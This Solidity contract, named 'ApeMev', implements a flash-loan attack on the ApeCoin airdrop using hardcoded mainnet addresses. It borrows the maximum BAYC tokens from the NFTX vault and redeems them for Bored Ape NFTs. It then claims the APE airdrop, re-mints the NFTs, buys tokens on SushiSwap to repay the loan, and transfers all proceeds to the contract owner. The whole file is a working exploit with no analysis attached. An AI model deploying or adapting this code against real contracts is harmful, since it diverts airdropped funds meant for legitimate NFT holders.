// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "openzeppelin-contracts/contracts/access/Ownable.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC20.sol";
import "v2-periphery/interfaces/IUniswapV2Router01.sol";
import "nftx-protocol-v2/solidity/interface/IERC3156Upgradeable.sol";
import "nftx-protocol-v2/solidity/NFTXVaultUpgradeable.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";

import { console } from "./test/utils/console.sol";


interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint value) external returns (bool);

    function withdraw(uint) external;
}

interface AirdropContract {
    function claimTokens() external;

    function getClaimableTokenAmount(address _account) external view returns (uint256);
}

contract ApeMev is Ownable, IERC3156FlashBorrowerUpgradeable, IERC721Receiver {

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BAYC_ERC721_ADDRESS = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
    address private constant APECOIN = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
    address private constant BAYC_NFTX_VAULT_ADDRESS = 0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5; // same address for BAYC VAULT ERC20 as well

    IERC20 private constant BAYC_VAULT_ERC20 = IERC20(BAYC_NFTX_VAULT_ADDRESS);
    NFTXVaultUpgradeable private constant NFTX_Vault = NFTXVaultUpgradeable(BAYC_NFTX_VAULT_ADDRESS);

    AirdropContract private constant AIRDROP = AirdropContract(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);

    IUniswapV2Router01 private constant SUSHI_ROUTER = IUniswapV2Router01(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    uint256[] private nftTokenIds;
    uint256 private loanAmount;

    function start() external onlyOwner {
        console.log("Starting MEV");
        getLoan();
        withdrawTokens();
    }

    function getLoan() internal {
        console.log("Requesting flash loan");
        // flashloan fee is 0 so we can request maximum amount
        uint256 maxFlashLoan = NFTX_Vault.maxFlashLoan(BAYC_NFTX_VAULT_ADDRESS);
        NFTX_Vault.flashLoan(this, BAYC_NFTX_VAULT_ADDRESS, maxFlashLoan, "");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        require(initiator == address(this), "!initiator");
        require(token == BAYC_NFTX_VAULT_ADDRESS, "!token");
        require(fee == 0, "!fee");

        console.log("Received flash loan");
        loanAmount = amount;

        executeMEV();
        repayLoan();

        return keccak256("ERC3156FlashBorrower.onFlashLoan");

    }

    function executeMEV() internal {
        SwapForApe();
        claimTokens();
        returnApes();
    }

    function SwapForApe() internal {
        console.log("Swapping bayc tokens for nfts");

        uint256 amount = NFTX_Vault.totalHoldings();
        uint256[] memory specifiedIds = new uint256[](0);

        BAYC_VAULT_ERC20.approve(address(NFTX_Vault), type(uint256).max);
        NFTX_Vault.redeem(amount, specifiedIds);

    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        require(BAYC_NFTX_VAULT_ADDRESS == operator, "!operator");
        require(BAYC_NFTX_VAULT_ADDRESS == from, "!from");

        console.log("Received Ape NFT with ID: ", tokenId);
        nftTokenIds.push(tokenId);

        // must return selector for safe transfer to succeed
        return IERC721Receiver.onERC721Received.selector;
    }

    function claimTokens() internal {
        console.log("Claiming airdrop");
        AIRDROP.claimTokens();
        uint256 apeCoinBalance = IERC20(APECOIN).balanceOf(address(this));

    }

    function returnApes() internal {
        console.log("Returning Apes NFTs to NFTX and mint vault token");
        IERC721(BAYC_ERC721_ADDRESS).setApprovalForAll(BAYC_NFTX_VAULT_ADDRESS, true);
        uint256[] memory amounts = new uint256[](0);
        uint256 before = BAYC_VAULT_ERC20.balanceOf(address(this));

        NFTX_Vault.mint(nftTokenIds, amounts);
    }

    function repayLoan() internal {
        console.log("Repaying flashloan");

        // We must make sure we have exact or greater amount of bayc vault tokens
        // as amount we have flash borrowed. We will swap WETH for tokens using SushiSwap

        uint256 currentBalance = BAYC_VAULT_ERC20.balanceOf(address(this));
        uint256 amountToGet = loanAmount - currentBalance;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = BAYC_NFTX_VAULT_ADDRESS;
        IERC20(WETH).approve(address(SUSHI_ROUTER), type(uint256).max);
        IWETH(WETH).deposit{value: 200 ether}();
        SUSHI_ROUTER.swapTokensForExactTokens(amountToGet, type(uint256).max, path, address(this), type(uint256).max);

        // flashloan will automatically get paid back
    }

    function withdrawTokens() public onlyOwner {
        IERC20(WETH).transfer(owner(), IERC20(WETH).balanceOf(address(this)));
        IERC20(BAYC_NFTX_VAULT_ADDRESS).transfer(owner(), IERC20(BAYC_NFTX_VAULT_ADDRESS).balanceOf(address(this)));
        IERC20(APECOIN).transfer(owner(), IERC20(APECOIN).balanceOf(address(this)));
    }



}
